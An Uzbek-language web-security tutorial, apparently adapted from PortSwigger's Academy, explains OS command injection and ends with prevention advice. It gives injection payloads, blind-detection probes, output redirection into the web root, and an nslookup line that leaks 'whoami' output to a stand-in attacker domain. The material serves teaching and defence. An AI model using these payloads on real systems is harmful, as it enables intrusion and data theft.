# OS command injection

Biz ushbu bo'limda OS Command Injection nima ekanligi haqida, undagi zaifliklar qanday ekanligi va ularni qanday exploit qilish haqida, turli Operatsion tizimlar uchun foydali komandalar haqida va xulosa qilib OS Command Injection ni qanday qilib oldini olish mumkinligi haqida gaplashamiz.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:yellow;">OS Command Injection nima ?</mark> <a href="#os-command-injection-nima" id="os-command-injection-nima"></a>

OS Command Injection (shell injection ham deyiladi ) bu Hakerga web sayt ichida ishlayotgan server da o'zboshimchalik bilan Operatsion tizim (OS) komandalarini ishlata olishga aytiladi. Ko'pincha, Haker hosting infratuzilmasining boshqa qismlarini buzish uchun OS Command Injection zaifligidan foydalanishi mumkin, bu xujumni tashkilot ichidagi boshqa tizimlarga yo'naltirish uchun o'zaro ishonchdan foydalanadi.

{% embed url="https://www.youtube.com/watch?feature=youtu.be&v=8PDDjCW5XWw" %}

## <mark style="color:yellow;">O'zboshimchalik bilan komandalarni ishga tushirish</mark> <a href="#ozboshimchalik-bilan-komandalarni-ishga-tushirish" id="ozboshimchalik-bilan-komandalarni-ishga-tushirish"></a>

Foydalanuvchiga mahsulotni saytning ombor(stock) ida  borligini tekshirish imkonini beruvchi do'kon saytini ko'rib chiqamiz. Ushbu ma'lumotlarga quyidagi URL orqali kirish mumkin:

```url
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

Stock ma'lumotlarini ko'rsatish uchun sayt unga ulangan turli tizimlardan ma'lumotlarni so'raydi. Tarixiy sabablarga ko'ra, bu funksionallik agument sifatida maxsulot va store IDlari bilan terminal komandasini chaqirishni amalga oshiradi:

```
stockreport.pl 381 29
```

Ushbu buyruq foydalanuvchiga stock ma'lumotlarini taqdim etadi.

Demak web saytning OS Comman Injection ga qarshi himoyasi yo'q, Haker shunda quyidagicha komandani yuborishi mumkin:

```
& echo aiwefwlguh &
```

Agar ushbu kiritilgan ma'lumotlar productID parametriga berilgan bo'lsa yuborilayotgan so'rov quyidagicha bo'ladi:

```
stockreport.pl & echo aiwefwlguh & 29
```

echo komandasi bu faqatgina matnni qaytaradi va bu OS Command Injection ni tekshirib ko'rishga ancha qulay. `&` belgisi shell ga komandalarni alohida ishlatish kerakligini bildiradi, ya'ni bitta komandadan keyin ikkinchi komanda yozish mumkin. Natija esa foydalanuvchiga quyidagicha boradi:

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

Ushbu uch qatorlik natija bizga quyidagilarni ma'lum qilyapti:

* Dastlabgi stockreport.pl komandasiga kiritilishi kerak bo'lgan argumentlarsiz ishladi va xatolik habarini qaytardi
* berilgan `echo` komandasi ishlagani va kerakli matnni qaytarganini
* Dastlabki 29 argumenti komanda sifatida ishlagani va error qaytarganini

Kiritilgan buyruqdan keyin & belgisini ham berish foyda beradi, chunki u kiritilgan buyruqni ineksiya qilinayotgan qismdan keyingi har qanday narsadan alohida ajratib turadi. Bu  kiritilgan buyruqning bajarilishiga to'sqinlik qilish ehtimolini kamaytiradi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Oddiy holatdagi OS command injection ≫](https://portswigger.net/web-security/os-command-injection/lab-simple)
{% endhint %}

## <mark style="color:yellow;">Foydali komandalar</mark> <a href="#foydali-komandalar" id="foydali-komandalar"></a>

Agar siz qachondir OS Command Injection zaifligini aniqlasangiz, tizim haqida ma'lumot olish uchun ba'zi bir boshlang'ich komandalarni bilishingiz foydalidir. Quyida biz sizga Linux va Windows Operatsion tizimlari uchun foydali komandalarni keltiramiz:

| Komanda maqsadi         | Linux       | Windows       |
| ----------------------- | ----------- | ------------- |
| Foydalanuvchi nomi      | whoami      | whoami        |
| Operatsion tizim nomi   | uname -a    | ver           |
| Tarmoq konfiguratsiyasi | ifconfig    | ipconfig /all |
| Tarmoq ulanishlari      | netstat -an | netstat -an   |
| Ishlayotgan protseslar  | ps -ef      | tasklist      |

## <mark style="color:yellow;">Blind OS Command Injection zaifliklari</mark> <a href="#blind-os-command-injection-zaifliklari" id="blind-os-command-injection-zaifliklari"></a>

Juda ko'p holatlarda OS Command Injection Blind (Ko'r) holatda bo'ladi. Bu degani, sayt HTTP response-ida buyruqning natijasini qaytarmaydi. Ushbu Blind (Ko'r) zaifliklarni exploit qilish mumkin lekin bizga boshqacha usullar kerak bo'ladi.

Foydalanuvchilarga sayt haqida fikr-mulohazalarini yuborish imkonini beruvchi web-saytni ko'rib chiqamiz. Foydalanuvchi o'zining elektron pochta manzilini va fikr-mulohaza xabarini kiritadi. Keyin server-side application sayt administratoriga fikr-mulohazalarni o'z ichiga olgan elektron pochta xabarini yaratadi. Buning uchun u yuborilgan ma'lumotlar bilan pochta dasturini chaqiradi. Misol uchun:

```
mail -s "This site is great" -aFrom:MuhammadSiddiq@normal-user.net feedback@vulnerable-website.com
```

`mail` komandasining natijasi (agar natija bo'lsa) saytning response-ida qaytarilmaydi, demak echo komandasidan foydalanish foydasiz. Bu holatda siz zaiflikni aniqlash va undan foydalanish uchun oldingilaridan ancha farq qiladigan usullarni qo'llashingiz zarur.

### <mark style="color:yellow;">Time delay (vaqtni kechiktirish) orqali Blind OS Command Injectionni aniqlash</mark> <a href="#kechikishlar-yordamida-blind-os-command-injection-ni-aniqlash" id="kechikishlar-yordamida-blind-os-command-injection-ni-aniqlash"></a>

Sizning komandalaringiz ishlaganini yoki ishlamaganini saytga time delaylar berib ko'rib aniqlashingiz mumkin va sayt sizga biroz kechroq javob qaytaradi, bu esa OS Command Injection ishladi degani. `ping` komandasi bu holatda eng yaxshi tanlov hisoblanadi, chunki ping komandasida biz qancha ICMP paketlarini yuborish kerakligini belgilay olamiz:

```
& ping -c 10 127.0.0.1 &
```

Ushbu komanda ishlaydi va loopback tarmoq interfeysini 10 soniya ping qiladi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Time delay orqali OS command injection ≫](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
{% endhint %}

### <mark style="color:yellow;">Natijani yo'naltirish orqali Blind OS Command Injectiondan foydalanish</mark> <a href="#blind-os-command-injection-ni-natijani-qaytarish-orqali-exploit-qilish" id="blind-os-command-injection-ni-natijani-qaytarish-orqali-exploit-qilish"></a>

Siz ishlatgan komandaning natijasini web saytdagi biror bir faylga yozishingiz va u faylni brauzer orqali ochishingiz mumkin. Masalan agarda web sayt static fayllarni fayl tizimidagi  `/var/www/static` joylashuvdan ishlatsa, unda siz quyidagi komandani yuborishingiz mumkin:

```
& whoami > /var/www/static/whoami.txt &
```

`>` mana bu belgi whoami komandasini biz argument sifatida bergan faylga yozadi. Siz esa uni o'qish uchun browserga [https://vulnerable-website.com/whoami.txt](https://vulnerable-website.com/whoami.txt) deb kiritishingiz kerak bo'ladi va siz ishlatgan buyrug'ingizning natijasini ko'ra olasiz.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Natijani yo'naltirish orqali Blind OS Command Injectiondan foydalanish ≫](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
{% endhint %}

### <mark style="color:yellow;">Out-of-band (OAST) texnikasi orqali Blind OS Command Injectionni exploit qilish</mark> <a href="#blind-os-command-injection-ni-out-of-band-oast-usullari-orqali-exploit-qilish" id="blind-os-command-injection-ni-out-of-band-oast-usullari-orqali-exploit-qilish"></a>

Siz OAST texnikasidan foydalangan holda siz boshqarayotgan tizim bilan out-of-band o'zaro tarmoq ta'sirini ishga tushiradigan ineksiya buyrug'idan foydalanishingiz mumkin. Masalan:

```
& nslookup kgji2ohoyw.web-attacker.com &
```

Ushbu payload belgilangan domen uchun DNS lookup qidiruvi uchun nslookup buyrug'idan foydalanadi. Haker belgilangan qidiruv sodir bo'lishini kuzatishi va shu orqali buyruq muvaffaqiyatli kiritilganligini aniqlashi mumkin.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Out-of-band o'zaro tasiri bilan Blind OS ineksiya ≫](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
{% endhint %}

Out-of-band channel shuningdek, kiritilgan buyruqlardan natijani chiqarishning oson yo'lini ham beradi:

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

Bu `whoami` buyrug'ing natijasini o'z ichiga olgan hackerning domeniga DNS lookup bo'lishiga olib keladi:

```
wwwuser.kgji2ohoyw.web-attacker.com
```

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Out-of-badn ma'lumot exfiltratsiyasi bilan OS Command injection ≫](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
{% endhint %}

## <mark style="color:yellow;">OS buyruqlarini ishlatish usullari</mark> <a href="#os-komandalarni-ishlatish-usullari" id="os-komandalarni-ishlatish-usullari"></a>

OS Command Injection hujumlarini amalga oshirish uchun turli shell meta-belgilaridan foydalanish mumkin.

Bir nechta belgilar **buyruqlarni ajratuvchi** sifatida ishlaydi va ular buyruqlarni birgalikda ishlatish imkonini beradi. Quyidagi buyruq ajratgichlar Windows va Unix-based tizimlarda ishlaydi:

* &
* &&
* |
* ||

Quyidagi **buyruqlarni ajratuvchi belgilar** faqat Unix-based tizimlarda ishlaydi:

* ;
* Yangi qator (\n yoki 0x0a)

Siz Unix-based tizimlarda backtick va dollar belgilaridan ham foydalana olasiz:

* `` ` ishlatilgan buyruq ` ``
* $(komanda )

Shuni esda tutingki, turli xil shell meta-belgilari ularning muayyan vaziyatlarda ishlashiga va in-band komanda natijasini olishga ruxsat berish yoki faqat ko'r-ko'rona foydalanish uchungina foydali bo'lishiga ta'sir qilishi mumkin bo'lgan har xil xatti-harakatlarga ega.

Ba'zan siz boshqaradigan input haqiqiy komandada qo'shtirnoq ichida paydo bo'ladi. Bunday holatda, yangi komandani kiritish uchun mos shell meta-belgilaridan foydalanishdan oldin ko'rsatilgan kontekstni (" yoki ' dan foydalanib) yopishingiz kerak.

## <mark style="color:yellow;">Qanday qilib OS Command Injection ni oldini olish mumkin ?</mark> <a href="#qanday-qilib-os-command-injection-ni-oldini-olish-mumkin" id="qanday-qilib-os-command-injection-ni-oldini-olish-mumkin"></a>

Hozirgacha OS command injection zaifliklarini oldini olishning eng samarali usuli bu hech qachon application-layer orqali OS komandalarini chaqirmaslikdir. Deyarli har bir holatda, xavfsizroq platforma API-lari yordamida kerakli funksiyalarni amalga oshirishning turli usullari mavjud.

Agar foydalanuvchi tomonidan kiritilgan ma'lumotlar bilan OS komandalarini chaqirish kerak bo'lsa, kuchli input tekshiruvi amalga oshirilishi kerak. Samarali input tekshiruvlariga ba'zi misollar quyidagilarni o'z ichiga oladi:

* Ruxsat berilgan qiymatlarning whitelist bilan tasdiqlash
* Kiritilgan ma'lumot raqam ekanligini tekshirish.
* Ma'lumot kiritilganda, faqat harf va raqamli belgilar bo'lishi va boshqa sintaksis yoki boʻsh joy yoʻqligini tekshirish.

Hech qachon shell meta-belgilarini aylanib o'tish orqali inputni tozalashga urinmang. Bu xatolik keltirib chiqarishi mumkin va malakali Haker tomonidan aylanib o'tilishi mumkin.
